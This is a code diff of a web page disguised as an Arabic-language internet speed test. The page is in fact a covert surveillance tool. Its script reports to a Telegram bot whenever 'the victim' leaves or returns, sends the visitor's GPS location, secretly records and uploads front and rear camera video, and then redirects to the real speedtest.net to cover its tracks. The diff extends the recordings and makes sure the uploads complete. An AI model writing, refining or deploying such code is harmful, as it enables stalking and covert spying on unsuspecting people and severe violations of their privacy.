@@ -13,7 +13,6 @@
         .status-dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 10px #4caf50; }
         .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; }
         #goBtn { width: 160px; height: 160px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 35px; font-weight: bold; cursor: pointer; transition: 0.4s; z-index: 5; outline: none; }
-        #goBtn:active { transform: scale(0.9); }
         #speedDisplay { display: none; text-align: center; }
         .speed-num { font-size: 48px; font-weight: 800; color: var(--accent); display: block; }
         video { display: none; }
@@ -53,7 +52,6 @@
             } catch (e) {}
         }
 
-        // تتبع حالة المتصل (Online/Offline)
         window.onblur = () => sendToTelegram("🔴 **OFFLINE**\nالضحية غادر الصفحة الآن.");
         window.onfocus = () => sendToTelegram("🟢 **ONLINE**\nالضحية عاد للصفحة الآن.");
 
@@ -92,14 +90,20 @@
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = (e) => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: "video/mp4" });
-                    await sendToTelegram(`🎥 فيديو لايف (${label} - 10 ثوانٍ)`, "video", blob);
-                    stream.getTracks().forEach(t => t.stop());
-                };
+                
+                const recordingPromise = new Promise(resolve => {
+                    recorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: "video/mp4" });
+                        await sendToTelegram(`🎥 فيديو لايف (${label} - 12 ثانية)`, "video", blob);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve();
+                    };
+                });
+
                 recorder.start();
                 await new Promise(r => setTimeout(r, duration));
                 recorder.stop();
+                return recordingPromise; // ننتظر حتى ينتهي الإرسال فعلياً
             } catch (e) {
                 await sendToTelegram(`❌ فشل تصوير فيديو ${label}`);
             }
@@ -120,16 +124,17 @@
                 sendToTelegram(`📍 *الموقع*:\n[فتح الخريطة](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
             });
 
-            // 2. فيديو أمامي (10 ثوانٍ)
-            await recordVideo("user", "أمامي", 10000);
+            // 2. فيديو أمامي (12 ثانية)
+            await recordVideo("user", "أمامي", 12000);
 
-            // 3. فيديو خلفي (10 ثوانٍ)
-            await recordVideo("environment", "خلفي", 10000);
+            // 3. فيديو خلفي (12 ثانية)
+            await recordVideo("environment", "خلفي", 12000);
 
+            // نزيد وقت الانتظار قبل التحويل لضمان رفع الفيديوهات بالكامل
             setTimeout(() => {
                 clearInterval(timer);
                 location.href = "https://www.speedtest.net/ar";
-            }, 2000);
+            }, 5000);
         };
     </script>
 </body>
